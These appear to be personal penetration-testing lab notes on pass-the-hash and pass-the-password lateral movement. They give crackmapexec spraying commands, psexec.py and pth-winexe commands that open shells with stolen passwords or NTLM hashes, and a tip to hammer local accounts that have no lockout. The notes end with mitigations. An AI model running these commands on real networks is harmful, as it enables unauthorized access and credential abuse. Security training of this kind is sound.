# Pass the Hash/Password

## What is it?

* using cracked passwords and SAM hashes for lateral movement in the network
* super powerful
* LOOK INTO "OVERPASS THE HASH"

## Crackmapexec Pass the Password

#### Crackmapexec Command

```bash
crackmapexec <protocol: smb is best> <ip/CIDR> -u <user> -d <domain> -p <pass>
```

#### Password Spraying?

* Domain Accounts have a lockout policy, but local accounts do not
* hammer local accounts!

#### Popping a Shell with the Credentials Received

```bash
psexec.py marvel/fcastle:'P@$$w0rd!'@172.16.35.6
```

#### Useful Flags

```bash
--sam # Flag to attempt a SAM dump at success
--shares # Enumerate shares
--help # Read the docs
```

## Crackmapexec Pass the Hash (cannot pass NTLMv2)

```bash
crackmapexec <protcol: smb is best> <ip/CIDR> -u <user> -H <last hash part>
```

#### Popping a Shell with the Credentials Received

```bash
psexec.py “frank castle”:@172.16.35.7 -hashes <LM+NT aka the whole hash>
```

## pth-winexe

```
// sushant747 method 1
pth-winexe -U administrator //192.168.1.101 cmd
// sushant747 method 2
pth-winexe -U admin/hash:has //192.168.0.101 cmd

// new learned method (new for me at least)
pth-winexe -U <username>%<hash...>:<...hash> //10.10.10.10 cmd
```

## Mitigations

#### Limit Account Reuse

* avoid re-using local admin password
* disable Guest and Administrator accounts
* limit who is local administrator (least privilege)

#### Utilize Strong Passwords

* the longer the better (>14 characters)
* avoid using common words
* i like long sentences

#### Privilege Access Management (PAM)

* check out/in sensitive accounts when needed
* automatically rotate passwords on check out and check in
* limits pass attacks on hash/password if strong and constantly rotated
